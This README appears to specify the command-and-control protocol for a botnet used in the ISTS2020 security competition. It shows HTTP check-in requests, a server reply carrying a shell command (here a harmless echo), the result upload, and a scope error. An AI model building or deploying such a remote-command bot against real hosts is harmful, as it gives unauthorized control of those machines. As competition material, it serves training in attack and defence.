# ISTS2020-Botnet


The botnet IP is at `http://172.16.0.56:80`

The botnet spec for ISTS2020.

Teams deploy their botnet across the infrastructure to capture hosts and gain points.


A sample python bot can be found in [bot.py](./bot.py).

## Botnet Spec

The botnet spec is rather simple, bots call back to the C2 every round using HTTP.

The first step is the checkin for commands

> Note: You can do this with either a GET or PUT request

```
GET /callback HTTP/1.1
Host: 192.168.177.195
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 58
Content-Type: application/json

{
  "team": "5",
  "ip": "192.168.177.195",
  "user": "www-data"
}
```

The server will reply with a command to execute and a command ID
```
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 191

{
  "command": "echo ggahgyvextpblhtdvamkgnpgexihtt", 
  "id": "9607189a-0163-48a0-80de-99b4fa9a8155", 
  "ip": "192.168.177.195", 
  "team": "5", 
  "type": "linux", 
  "user": "www-data"
}
```


Once a command is received, the bot must execute the command and return the results to the server. This is done through a simple POST request.

```
POST /callback HTTP/1.1
Host: 192.168.177.195:5000
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 93
Content-Type: application/json

{
  "id": "9607189a-0163-48a0-80de-99b4fa9a8155",
  "results": "ggahgyvextpblhtdvamkgnpgexihtt\n"
}
```

The server will then send back a message indicating whether or not the check in was successful.

```
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 143

{
  "id": "9607189a-0163-48a0-80de-99b4fa9a8155", 
  "ip": "192.168.177.195", 
  "msg": "successful check in", 
  "time": 1581107673.8783097
}
```


## Errors

If there is an error during the process, the server will add the "error" field in the JSON with a description of the error.


In the following example, the bot tries to call back from a host that is not in the scope of the team's attack space.

```
GET /callback HTTP/1.1
Host: 192.168.177.195:5000
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 50
Content-Type: application/json

{"team": "5", "ip": "8.8.8.8", "user": "www-data"}

HTTP/1.0 400 BAD REQUEST
Content-Type: application/json
Content-Length: 45

{
  "error": "unknown IP address: 8.8.8.8"
}
```